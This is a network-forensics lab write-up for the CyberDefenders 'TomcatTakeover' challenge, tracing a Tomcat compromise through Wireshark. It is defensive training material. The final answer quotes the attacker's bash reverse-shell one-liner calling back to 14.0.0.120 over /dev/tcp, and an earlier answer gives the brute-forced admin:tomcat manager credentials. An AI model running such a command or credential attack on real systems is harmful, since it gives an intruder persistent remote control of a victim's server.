# TomcatTakeover

# Details

Instructions:

Uncompress the lab (pass: cyberdefenders.org)
Scenario:

Our SOC team has detected suspicious activity on one of the web servers within the company's intranet. In order to gain a deeper understanding of the situation, the team has captured network traffic for analysis. This pcap file potentially contains a series of malicious activities that have resulted in the compromise of the Apache Tomcat web server. We need to investigate this incident further.

Tools:

Wireshark
NetworkMiner

# Solution

## Question 1
Given the suspicious activity detected on the web server, the pcap analysis shows a series of requests across various ports, suggesting a potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

The question is asking us to find the IP address that is performing a port scannin operation on our network. To find this we can go ahead and go to Statistics > Endpoints > TCP to get a better idea as to which IP address is making the most requests to different port numbers.

![Endpoint](https://github.com/user-attachments/assets/da7cd5bb-1de0-4846-9e36-881d1b43619e)

Looking at the results we can see that the IP 14.0.0.120 has made requests to various port numbers most of them being above the common ports range which warrants suspicious behaviour.

### Answer
14.0.0.120

## Question 2
Based on the identified IP address associated with the attacker, can you ascertain the city from which the attacker's activities originated?

For this we can simply go to a site like abuseipdp.com and check IP information.

![AbuseIPDP](https://github.com/user-attachments/assets/6d4dc27f-9b99-4b74-93e6-69e96ba54a4a)

### Answer
Guangzhou

## Question 3
From the pcap analysis, multiple open ports were detected as a result of the attacker's activitie scan. Which of these ports provides access to the web server admin panel?

For this we can start of by filtering for HTTP packets, since the question is asking to find the port relating to a web server which communicates in HTTP.

![http](https://github.com/user-attachments/assets/d5d8dfe8-ce82-47fe-805d-32adb8b0aefc)

This gives us a bunch of packets. Now let's try narrowing it down even further. We can go to Statistics > Conversations to get a clear look into what ports are involved in the HTTP packets.

![ports](https://github.com/user-attachments/assets/3ecdd6e0-7d54-4f0b-82a4-c28bf1b78c10)

Looking at the results it seems there is only one port involved in HTTP which is 8080 which we can safely conclude that this is the correct answer. Should there have been more ports than one which is unlikely we could have gone on to filter for the ports that involve an admin page.

### Answer
8080

## Question 4
Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

Looking at the HTTP packets we can see a bunch of requests that are made in a short period of time indicating an automation. This is typical behaviour for directory busting software.

![dirbust_sus](https://github.com/user-attachments/assets/26c67847-8f04-42b5-9170-d817032451c1)


Looking at one of these packets reveals to us the tool used by the attacker

![proof](https://github.com/user-attachments/assets/385c7c96-6bf3-4a39-916d-7af6457b3edf)


### Answer
gobuster

## Question 5
Subsequent to their efforts to enumerate directories on our web server, the attacker made numerous requests trying to identify administrative interfaces. Which specific directory associated with the admin panel was the attacker able to uncover?

To find this we can use the filter 'http.request or http.response.code != 404' this filter will filter for HTTP Requests and Responses for the pages that exist within the server. This will allow us to more efficiently sift through the data.

After sifting through the data we stumble across the admin panel


![admin](https://github.com/user-attachments/assets/95880ed0-cdd9-4d18-911e-b247f587bdd0)

We can see a request for /manager/html which provides a response of Unauthorized telling us that the /manager is only accessible to admnins.

### Answer
/manager

## Question 6
Upon accessing the admin panel, the attacker made attempts to brute-force the login credentials. From the data, can you identify the correct username and password combination that the attacker successfully used for authorization?

To find this we can look through all the requests to /manager/html until we find a response OK to that request.


![OK](https://github.com/user-attachments/assets/30243610-fff4-432f-b637-8aea2167e464)

We can see that after a series of unsuccessful attempts the attacker gets an OK response from the server indicating that the credentials worked. To look at what credentials they used we can check the Authorization header under the HTTP data in the Packet

![credentials](https://github.com/user-attachments/assets/0fcc4cfa-4dc0-4dcb-9c54-7200a3142319)

### Answer
admin:tomcat

## Question 7
Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

To find this we can filter for POST packets. This can be done using the filter 'http.request.method == POST'.

![POST](https://github.com/user-attachments/assets/903d536a-a692-4d24-80a1-ddd090d2e557)

We can see that there is only 1 POST packet, looking into the packet information we can see what file was uploaded.

![file](https://github.com/user-attachments/assets/9b4a918f-43f4-47f1-91df-85cd402139df)

### Answer
JXQOZY.war

## Question 8
Upon successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

To find this we can look for a request to the file that was uploaded, since the server needs to run the file for the commands to be executed, and then look at subsequent connections between the attacker and the server to find any commands run by the attacker

![search](https://github.com/user-attachments/assets/2144f96b-fb0c-43b1-ba90-0dd75e56f202)

We can see that the attacker sent a request to GET /JXQOZY/ indicating that the attacker tried to run the malicious file that we uncovered in the previous question. We can see a few packets later that the server sends an OK response indicating that the malicious file was opened. Looking at the next few packets we stumble upon a packet which has 'whoami' as part of it's data. whoami is a common command which is used by attackers to find out what account they are currently using. Following this TCP Stream we can uncover all the other commands run by the attacker.

![persistence](https://github.com/user-attachments/assets/fe764159-e959-4215-9f71-edd1ad1d0c8c)

We can see that there is a command for cron, which is a task scheduler for Unix like operating systems, which is commonly used for persistence by attacker.

### Answer
/bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'


## Conclusion
This was a relatively easy and beginner friendly challenge which helped me practice my Network Forensic skills and Wireshark skills. 
